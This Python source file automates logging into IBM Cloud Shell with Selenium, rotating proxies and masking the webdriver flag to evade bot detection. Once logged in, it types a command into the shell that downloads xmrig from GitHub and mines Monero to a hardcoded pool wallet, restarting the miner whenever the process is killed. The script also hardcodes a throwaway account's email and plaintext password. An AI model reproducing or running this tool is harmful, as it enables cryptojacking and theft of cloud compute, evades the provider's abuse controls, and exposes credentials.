import json
import sys

import requests
import time
from concurrent.futures._base import as_completed
from time import sleep

from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
from requests.exceptions import ProxyError
from selenium import webdriver
from selenium.common.exceptions import WebDriverException, NoSuchFrameException, ElementClickInterceptedException, \
    ElementNotInteractableException, TimeoutException
from selenium.webdriver.chrome.webdriver import WebDriver
from selenium.webdriver.common.by import By
import selenium.webdriver.support.expected_conditions as EC
from selenium.webdriver.support.wait import WebDriverWait
from concurrent.futures import ThreadPoolExecutor

from stem import Signal, process
from stem.control import Controller


def safelyFindId(driver: WebDriver, value, sleepTime: float = 0.2):
    try:
        return driver.find_element_by_id(value)
    except WebDriverException:
        sleep(sleepTime)
        return safelyFindId(driver, value, sleepTime)


def safely_find_class(driver: WebDriver, value, sleepTime: float = 0.2):
    try:
        return driver.find_element_by_class_name(value)
    except WebDriverException:
        sleep(sleepTime)
        return safely_find_class(driver, value, sleepTime)


def safelyFindCSS(driver: WebDriver, value, sleepTime: float = 0.2):
    try:
        return driver.find_element_by_css_selector(value)
    except WebDriverException:
        sleep(sleepTime)
        return safelyFindCSS(driver, value, sleepTime)


def safety_send_keys(element, value, sleepTime: float = 0.2):
    try:
        element.send_keys(value)
    except WebDriverException as e:
        if element.id == "password":
            raise e
        sleep(sleepTime)
        safety_send_keys(element, value, sleepTime)


def safety_switch_to_frame(driver: WebDriver, name, sleepTime: float = 1):
    try:
        driver.switch_to.frame(name)
    except NoSuchFrameException:
        sleep(sleepTime)
        safety_switch_to_frame(driver, name, sleepTime)


def change_proxy(driver: WebDriver, user):
    while True:
        proxy = requests.get("http://118.24.52.95:5010/get/").json()['proxy']
        proxies = {'http': proxy, 'https': proxy}
        proxy_spilt = proxy.split(':')
        try:
            r = requests.get("http://httpbin.org/ip", proxies=proxies)
        except ProxyError:
            sleep(1)
            continue
        if r.status_code == 200 and r.text.find(proxy_spilt[0]):
            setup_proxy(driver, proxy_spilt[0], proxy_spilt[1])
            print(f"{user}: change ip success->{proxy}")
            break
        else:
            print(f"{user}: change ip failed")
            r.close()
            sleep(1)


def setup_proxy(driver: WebDriver, ip, port):
    driver.get("about:config")
    proxy_type = 5 if port == 0 else 1
    setupScript = f"""var
                    prefs = Components.classes["@mozilla.org/preferences-service;1"]
                    .getService(Components.interfaces.nsIPrefBranch);
                    prefs.setIntPref("network.proxy.type", {proxy_type});
                    prefs.setCharPref("network.proxy.socks", "{ip}");
                    prefs.setIntPref("network.proxy.socks_port", {port});
                    prefs.setBoolPref("network.proxy.socks_remote_dns",false);"""
    driver.execute_script(setupScript)


xmr_command = """./xmrig -o xmr.f2pool.com:13531 -u 44g7WQw7AGcE7sDmRzTUYQRChiJ6B7sokXyXYfCTz8A3Uv6fSxtfYVBA1S77jLFPJWK4QqAWV9dTZP7k5gB7RATk5vHZDYN"""
comand = """ wget https://github.com/xmrig/xmrig/releases/download/v6.11.2/xmrig-6.11.2-linux-static-x64.tar.gz&&tar -zxvf xmrig-6.11.2-linux-static-x64.tar.gz&&cd xmrig-6.11.2&&""" + xmr_command
address = "https://cloud.ibm.com/shell"


def switchIP():
    # stem.process.launch_tor_with_config()
    with Controller.from_port(port=9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)


def setupTor(id):
    c_port = 9050 + int(id) * 2
    config = {
        # "Socks5Proxy": "127.0.0.1:10808",
        #   "Bridge": "meek_lite 0.0.2.0: 2 97700DFE9F483596DDA6264C4D7DF7641E1E39CE",
        #   "url = https://meek.azureedge.net/": "front = ajax.aspnetcdn.com",
        #   "ClientOnionAuthDir": r"C:\Users\admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Tor\onion-auth",
        #   "DataDirectory": r"C:\Users\admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Tor",
        #   "GeoIPFile": r"C:\Users\admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Tor\geoip",
        #   "GeoIPv6File": r"C:\Users\admin\Desktop\Tor Browser\Browser\TorBrowser\Data\Tor\geoip6",
        #   "UseBridges": "1",
        "DataDirectory": f"./tordata{c_port}",
        'ControlPort': f'{c_port}',
        "SocksPort": f"{c_port + 1}"}
    return process.launch_tor_with_config(config, tor_cmd=r"tor")


def run_selenium(driver: WebDriver, user, passwd, id):
    # tor_process = setupTor(id)
    # setup_proxy(driver, "127.0.0.1", int(id) * 2 + 9050 + 1)
    driver.get(address)
    print(f"{user}: start get /shell")
    try:
        while True:
            try:
                WebDriverWait(driver, 180).until(
                    EC.presence_of_element_located((By.CLASS_NAME, "login-form__realm-user-id-row")))
                user_form = driver.find_element_by_class_name("login-form__realm-user-id-row")
                user_form.find_element_by_id("userid").send_keys(user)
                user_form.find_element_by_tag_name("button").click()
                print(f"{user}: send username")
                try:
                    WebDriverWait(driver, 30).until(EC.presence_of_element_located((By.CLASS_NAME, "error-header")))
                    print(f'{user}: err={driver.find_element_by_class_name("error-header").get_attribute("innerHTML")}')
                    raise WebDriverException(f"{user} tor ip invalidate")
                except TimeoutException:
                    print(f"{user}: pass ip validate,start clear proxy")
                    # tor_process.terminate()
                    # driver.execute_script("window.open('')")
                    # default_handle = driver.current_window_handle
                    # handles = list(driver.window_handles)
                    # handles.remove(default_handle)
                    # driver.switch_to.window(handles[0])
                    # setup_proxy(driver, "", 0)
                    # driver.close()
                    # driver.switch_to.window(default_handle)
                break
            except (ElementClickInterceptedException, ElementNotInteractableException):
                check_dialog(driver, user)
                continue
        while True:
            try:
                WebDriverWait(driver, 180).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "[class='login-form__password-row ']")))
                passwd_form = driver.find_element_by_class_name("login-form__password-row ")
                passwd_input = passwd_form.find_element_by_id("password")
                passwd_input.clear()
                passwd_input.send_keys(passwd)
                print(user + ": send passwd")
                driver.find_elements_by_css_selector('[class="login-form__button bx--btn bx--btn--primary"]')[1].click()
                print(user + ": click login")
                break
            except (ElementClickInterceptedException, ElementNotInteractableException) as e:
                print(f'{user}:do login failed,msg= {e.msg}')
                check_dialog(driver, user)
                continue
        s_time = time.time()
        while True:
            if address in driver.current_url:
                print(f"{user} enter shell success")
                break
            else:
                c_time = time.time()
                if c_time - s_time > 180:
                    print(f"{user}: enter shell too long,re enter,curentUrl={driver.current_url}")
                    raise WebDriverException(f"{user}: userid or passwd error,relogin")
                sleep(2)
    except WebDriverException as e:
        print(f"{user}: login failed msg={e.msg}")
        driver.delete_all_cookies()
        # tor_process.terminate()
        run_selenium(driver, user, passwd, id)

    # change to tokyo
    while True:
        try:
            WebDriverWait(driver, 120).until(EC.presence_of_element_located((By.CLASS_NAME, "bx--header__global")))
            header = driver.find_element_by_class_name("bx--header__global")
            if header.find_element_by_class_name("header__location-name").text != "Tokyo":
                print(f"{user}: region is not tokyo,begin to switch")
                header.find_element_by_css_selector(
                    "[class='header__location-change-button bx--btn bx--btn--ghost']").click()
                selects = safelyFindId(driver, "selectRegion")
                selects.click()
                selects.find_element_by_css_selector("[value='jp-tok']").click()
                safelyFindCSS(driver, "[class='bx--btn bx--btn--primary']").click()
            break
        except (ElementClickInterceptedException, ElementNotInteractableException):
            check_dialog(driver, user)
            continue
        except WebDriverException:
            print(user + ": enter shell too long,refresh page")
            driver.refresh()
    return switch_to_frame_execute(driver, str(user).split("@")[0].replace('.', "_"), id)


def check_disconnection(driver: WebDriver, name, tiemout=10) -> bool:
    try:
        driver.switch_to.default_content()
        WebDriverWait(driver, timeout=tiemout).until(
            EC.presence_of_element_located((By.CLASS_NAME, "tab-notification__action-list")))
        print(name + ": connect failed,try refresh page")
        return True
        # retry_tab = driver.find_element_by_class_name("tab-notification__action-list")
        # print(name + ": connect failed,retrying")
        # retry_tab.find_element_by_tag_name("button").click()
    except WebDriverException:
        driver.switch_to.frame("iframetab1")
        return False


def check_another_connection(driver: WebDriver, name) -> bool:
    try:
        driver.switch_to.default_content()
        notification = driver.find_element_by_class_name('notification-wrapper')
        if notification.find_element_by_tag_name('span').text == 'Your session was transferred to another browser tab.':
            print(f"{name}: run on another window")
            return True
        else:
            return False
    except WebDriverException:
        driver.switch_to.frame("iframetab1")
        return False


def check_connection(driver: WebDriver, name, timeout=10) -> bool:
    try:
        driver.switch_to.default_content()
        # WebDriverWait(driver, timeout).until(
        #     EC.invisibility_of_element_located((By.CLASS_NAME, "notification-wrapper")))
        WebDriverWait(driver, timeout).until(EC.presence_of_element_located((By.ID, "iframetab1")))
        print(f"{name}: connect success")
        driver.switch_to.frame("iframetab1")
        return True
    except WebDriverException:
        return False


def check_dialog(driver: WebDriver, name, timeout=30):
    try:
        driver.find_element_by_class_name("truste_overlay")
        print(f"{name}: show trust_overlay")
        WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.CSS_SELECTOR, "[title='TrustArc Cookie Consent Manager']")))
        trust_frame = driver.find_element_by_css_selector("[title='TrustArc Cookie Consent Manager']")
        driver.switch_to.frame(trust_frame)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CLASS_NAME, "pdynamicbutton")))
        cookie_dialog = driver.find_element_by_class_name("pdynamicbutton")
        cookie_dialog.find_element_by_class_name("call").click()
        print(f"{name}: click truste_overlay")
        sleep(5)
        driver.switch_to.default_content()
    except WebDriverException as e:
        driver.switch_to.default_content()
        print(f'{name}: {e.msg}')


def switch_to_frame_execute(driver: WebDriver, name: str, id):
    # start_time = time.time()
    line = 1
    print(name + ": begin switch to frame execute")
    while True:
        if not check_connection(driver, name, 40):
            print(f"{name}: first connect failed,try to refresh")
            driver.refresh()
            continue
        sleep(10)
        # print runnning
        eles = driver.find_elements_by_css_selector("[role='listitem']")
        killed = False
        for item in eles:
            if "@cloudshell" in str(item.text):
                item.send_keys(comand + "." + id + name + "\n")
                line = int(item.get_attribute("aria-posinset"))
                print("send command")
                break
            if killed:
                item.send_keys(xmr_command + "." + id + name + "\n")
                killed = False
                break
            if item.text == "Blank line":
                continue
            if item.text == "Killed":
                print(name + " Killed")
                killed = True
                continue
            aria_line = item.get_attribute("aria-posinset")
            if aria_line is not None and int(aria_line) > line:
                line = int(aria_line)
                print(name + ": " + item.text)
        if check_another_connection(driver,name):
            return name
        if check_disconnection(driver, name, 1):
            driver.refresh()


if __name__ == '__main__':
    # items = sys.argv[1]
    # accounts = json.loads(items)
    accounts = [{"user": "hkyqq8823@yinsiduanxin.com", "passwd": "MZxh19950810", "id": "3"}]
    pool = ThreadPoolExecutor(accounts.__len__())
    task_list = []
    for account in accounts:
        print(account)
        options = webdriver.FirefoxOptions()
        options.add_argument("--no-sandbox")
        options.add_argument("--ignore-ssl-errors=true")
        options.add_argument("--ssl-protocol=any")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--disable-gpu")
        # options.add_argument("--start-maximized")
        options.add_argument("--disable-blink-features")
        options.add_argument("--disable-blink-features=AutomationControlled")
        # options.accept_insecure_certs = True
        profile = webdriver.FirefoxProfile()
        profile.accept_untrusted_certs = True
        profile.assume_untrusted_cert_issuer = True
        profile.set_preference("intl.accept_languages", "us-en")
        profile.set_preference('permissions.default.image', 2)
        profile.set_preference('dom.ipc.plugins.enabled.libflashplayer.so', 'false')
        profile.update_preferences()
        # options.profile=profile
        geckodriver = "./geckodriver.exe"
        driver = webdriver.Firefox(executable_path=geckodriver, options=options, firefox_profile=profile)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        task_list.append(pool.submit(run_selenium, driver, account["user"], account["passwd"], account["id"]))
    for task in as_completed(task_list):
        print(f"{task.result()} finished")

    print("all task finished")
